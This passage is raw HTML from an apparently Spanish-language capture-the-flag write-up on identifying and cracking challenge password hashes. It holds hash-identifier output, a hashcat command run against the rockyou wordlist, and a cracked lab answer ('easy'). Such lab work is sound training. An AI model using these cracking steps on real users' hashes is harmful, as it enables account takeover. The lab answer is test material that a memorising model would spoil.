   &lt;span class=&#34;c1&#34;&gt;#	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#								 By Zion3R #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#							www.Blackploit.com #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#						       Root@Blackploit.com #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#########################################################################&lt;/span&gt;

   -------------------------------------------------------------------------
 HASH: 48bb6e862e54f2a795ffc4e541caed4d

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Domain Cached Credentials - MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MD4&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtolower&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RAdmin v2.x
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  NTLM
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Wordpress&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.0.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.LF.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtoupper&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation&#34;&gt;CrackStation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2021.57.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;easy:48bb6e862e54f2a795ffc4e541caed4d&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-sha1&#34;&gt;#2 SHA1&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;CBFDAC6008F9CAB4083784CBD1874F76618D2A97&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier-1&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; HASH: CBFDAC6008F9CAB4083784CBD1874F76618D2A97

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MySQL5 - SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MaNGOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MaNGOS2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
